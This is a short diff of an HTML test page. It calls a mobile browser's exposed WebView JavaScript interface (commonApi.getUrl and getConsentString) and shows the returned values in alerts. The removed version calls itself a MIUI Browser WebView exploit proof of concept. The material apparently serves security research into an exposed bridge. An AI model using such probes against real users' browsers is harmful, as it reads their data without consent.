@@ -1,15 +1,17 @@
-<!DOCTYPE html>
 <html>
   <body>
-    <h2>MIUI Browser WebView Exploit PoC</h2>
-
+    <h1>JS Interface Test</h1>
     <script>
       try {
-        var cmp = window.commonApi.getConsentString();
-        var url = window.commonApi.getUrl();
-        alert("[PoC] ConsentString: " + cmp + "\n[PoC] URL: " + url);
-      } catch (e) {
-        alert("Exploit failed: " + e);
+        alert("URL: " + window.commonApi.getUrl());
+      } catch(e) {
+        alert("Error: " + e);
+      }
+
+      try {
+        alert("Consent: " + window.commonApi.getConsentString());
+      } catch(e) {
+        alert("Error: " + e);
       }
     </script>
   </body>
